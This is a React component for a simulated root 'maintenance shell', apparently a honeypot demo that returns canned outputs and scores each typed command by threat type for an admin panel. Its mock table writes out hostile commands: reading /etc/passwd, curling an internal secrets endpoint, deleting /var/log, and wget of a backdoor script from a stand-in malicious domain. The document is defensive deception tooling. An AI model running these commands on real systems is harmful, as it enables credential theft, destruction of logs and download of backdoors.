"use client";

import { useState, useRef, useEffect } from "react";
import Link from "next/link";
import { LogOut, AlertCircle, TerminalSquare } from "lucide-react";
import { useSessions } from "@/lib/session-context";

export default function Terminal() {
  const { sessions, registerSession, addCommand } = useSessions();
  const [sessionId, setSessionId] = useState("");

  useEffect(() => {
    const newId = "session-" + Math.random().toString(36).substr(2, 9);
    setSessionId(newId);
    registerSession(newId);
  }, []);

  const currentSession = sessions.find((s) => s.id === sessionId);
  const isTerminated = currentSession && !currentSession.isActive;
  const [commandHistory, setCommandHistory] = useState<
    Array<{ input: string; output: string }>
  >([
    {
      input: "",
      output: "Authentication successful. Entering maintenance shell...",
    },
  ]);
  const [currentInput, setCurrentInput] = useState("");
  const [commandIndex, setCommandIndex] = useState(-1);
  const terminalRef = useRef<HTMLDivElement>(null);

  // Mock command responses
  const commandResponses: Record<string, string> = {
    ls: "bin   boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var",
    whoami: "root",
    id: "uid=0(root) gid=0(root) groups=0(root)",
    pwd: "/root",
    "sudo su": "root@corp-server:~#",
    "sudo -l":
      "User root may run the following commands on corp-server:\n    (ALL) ALL",
    "cat /etc/passwd":
      "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin",
    "nmap -sV localhost":
      "Starting Nmap 7.80\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00015s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh",
    "curl http://internal-api:8080/secrets":
      "API_KEY=sk-1234567890\nDB_PASSWORD=secure_pass123",
    "ps aux":
      "root        1  0.0  0.1   4096  1024 ?   Ss   12:00   0:00 /sbin/init\nroot      100  0.0  0.2   8192  2048 ?   S    12:05   0:00 sshd: /usr/sbin/sshd [listener]",
    "rm -rf /var/log": "Operation completed.",
    "wget http://malicious-domain.com/backdoor.sh":
      "--2024-01-17 12:15:30-- http://malicious-domain.com/backdoor.sh\nResolving malicious-domain.com... 192.168.1.100\nConnecting to malicious-domain.com... connected.",
    help: "Available commands: ls, cd, cat, whoami, id, sudo, ps, top, curl, wget, nmap, rm",
    clear: "",
  };

  const handleCommand = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      e.preventDefault();
      const cmd = currentInput.trim();

      if (cmd === "clear") {
        setCommandHistory([
          {
            input: "",
            output: "Authentication successful. Entering maintenance shell...",
          },
        ]);
        setCurrentInput("");
      } else {
        const output =
          commandResponses[cmd] || `bash: ${cmd}: command not found`;
        setCommandHistory([...commandHistory, { input: cmd, output }]);

        // Log command to backend
        // Determine basic threat level for demo purposes
        let threat = "normal";
        let riskIncrease = 0;

        if (["whoami", "pwd", "ls", "cd"].includes(cmd.split(" ")[0])) {
          threat = "normal";
          riskIncrease = 1;
        } else if (["ps", "top", "id"].includes(cmd.split(" ")[0])) {
          threat = "reconnaissance";
          riskIncrease = 5;
        } else if (cmd.includes("nmap")) {
          threat = "reconnaissance";
          riskIncrease = 10;
        } else if (cmd.includes("cat /etc/passwd")) {
          threat = "credential-access";
          riskIncrease = 25;
        } else if (cmd.includes("sudo")) {
          threat = "privilege-escalation";
          riskIncrease = 20;
        } else if (cmd.includes("wget") || cmd.includes("curl")) {
          threat = "persistence";
          riskIncrease = 15;
        } else if (cmd.includes("rm ")) {
          threat = "destructive";
          riskIncrease = 50;
        }

        addCommand(sessionId, {
          id: `cmd-${Date.now()}`,
          timestamp: Date.now(),
          command: cmd,
          output: output.substring(0, 50) + "...", // Truncate for storage
          threat,
          riskIncrease
        });

        setCurrentInput("");
        setCommandIndex(-1);
      }
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      const historyLength = commandHistory.filter(
        (c) => c.input.length > 0,
      ).length;
      if (historyLength > 0) {
        const newIndex =
          commandIndex === -1
            ? historyLength - 1
            : Math.max(0, commandIndex - 1);
        const historicalCommands = commandHistory.filter(
          (c) => c.input.length > 0,
        );
        setCurrentInput(historicalCommands[newIndex].input);
        setCommandIndex(newIndex);
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const historicalCommands = commandHistory.filter(
        (c) => c.input.length > 0,
      );
      if (commandIndex >= 0 && commandIndex < historicalCommands.length - 1) {
        setCurrentInput(historicalCommands[commandIndex + 1].input);
        setCommandIndex(commandIndex + 1);
      } else {
        setCurrentInput("");
        setCommandIndex(-1);
      }
    }
  };

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [commandHistory]);

  return (
    <div className="min-h-screen bg-gray-900 text-gray-100 flex flex-col">
      {/* Header */}
      <div className="bg-gray-800 border-b border-gray-700 px-6 py-4 flex items-center justify-between">
        <div>
          <h1 className="text-lg font-semibold text-white">
            Maintenance Shell
          </h1>
          <p className="text-xs text-gray-500">Session: {sessionId}</p>
        </div>
        <div className="flex gap-2 items-center">
          <div className="flex items-center gap-2 px-3 py-1 bg-orange-900 bg-opacity-30 rounded">
            <AlertCircle className="w-4 h-4 text-orange-400" />
            <span className="text-xs text-orange-300">Monitoring Active</span>
          </div>
          <Link
            href="/admin"
            className="text-gray-400 hover:text-gray-300 transition-colors"
          >
            <span className="text-xs">Admin Panel</span>
          </Link>
          <button
            onClick={() => (window.location.href = "/")}
            className="text-gray-400 hover:text-gray-300 transition-colors"
          >
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Terminal */}
      <div
        ref={terminalRef}
        className="flex-1 overflow-y-auto p-6 space-y-2 bg-gray-900 font-mono text-sm"
      >
        {commandHistory.map((item, idx) => (
          <div key={idx}>
            {item.input && (
              <div className="text-green-400">
                {isTerminated && idx === commandHistory.length - 1 ? (
                  <span className="text-red-500">Connection closed by remote host.</span>
                ) : (
                  <>
                    root@corp-server:~${" "}
                    <span className="text-white">{item.input}</span>
                  </>
                )}
              </div>
            )}
            {item.output && (
              <div className="text-gray-300 whitespace-pre-wrap text-xs mb-2">
                {item.output}
              </div>
            )}
          </div>
        ))}

        {/* Input Line */}
        <div className="flex items-center gap-2">
          <span className="text-green-400">root@corp-server:~$</span>
          {isTerminated ? (
            <span className="text-red-500">Connection closed. Press Refresh to restart.</span>
          ) : (
            <input
              type="text"
              value={currentInput}
              onChange={(e) => setCurrentInput(e.target.value)}
              onKeyDown={handleCommand}
              autoFocus
              className="flex-1 bg-transparent text-white outline-none caret-white"
              placeholder="Type command..."
              autoComplete="off"
            />
          )}
        </div>
      </div>

      {/* Footer */}
      <div className="bg-gray-800 border-t border-gray-700 px-6 py-2 text-xs text-gray-500">
        <p>
          Type &apos;help&apos; for available commands | Session will be logged
          and analyzed
        </p>
      </div>
    </div>
  );
}
